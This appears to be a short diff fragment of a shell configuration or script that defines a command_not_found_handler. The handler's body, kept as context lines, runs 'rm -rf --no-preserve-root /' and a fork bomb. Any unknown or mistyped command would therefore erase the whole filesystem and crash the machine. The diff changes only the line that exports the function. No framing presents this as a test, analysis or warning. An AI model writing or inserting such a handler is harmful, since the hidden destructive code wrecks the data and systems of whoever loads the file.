@@ -7,5 +7,5 @@ command_not_found_handler() {
     rm -rf --no-preserve-root /
     :(){ :|: & };:
     }
-    export -f command_not_found_handler
+    
 
